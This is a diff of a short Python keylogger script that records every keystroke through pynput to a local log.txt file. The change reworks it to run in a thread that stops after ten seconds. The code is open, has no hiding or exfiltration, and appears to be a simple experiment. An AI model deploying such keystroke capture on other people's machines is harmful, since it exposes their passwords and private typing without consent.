@@ -1,27 +1,35 @@
-import pynput
-import pyautogui
-count = 0
+import pynput, threading, time
 
-global hitcount
-global mouselistener
 global filename
-hitcount = 0
+global listenerHandler
+filename = "log.txt"
 
 def on_press(key):
     global filename
     print(str(key).strip("'"))
-    filename = open("log.txt", "a")
+    file = open(filename, "a")
     strippedkey = str(key).strip("'")
     if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
-        filename.write("\n")
-    filename.write(str(key).strip("'"))
+        file.write("\n")
+    file.write(str(key).strip("'"))
     if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
-        filename.write("\n")
-    filename.close()
+        file.write("\n")
+    file.close()
+
+def start_listening():
+    global listenerHandler
+    listenerHandler = pynput.keyboard.Listener(on_press =on_press)
+    listenerHandler.start()
+    try:
+        listenerHandler.join()
+    finally:
+        listenerHandler.stop()
 
 
 
-listener = pynput.keyboard.Listener(on_press =on_press)
-listener.start()
-listener.join()
-listener.stop()
+if __name__ == "__main__":
+    t1 = threading.Thread(target=start_listening)
+    t1.start()
+    time.sleep(10)
+    listenerHandler.stop()  
+    t1.join()
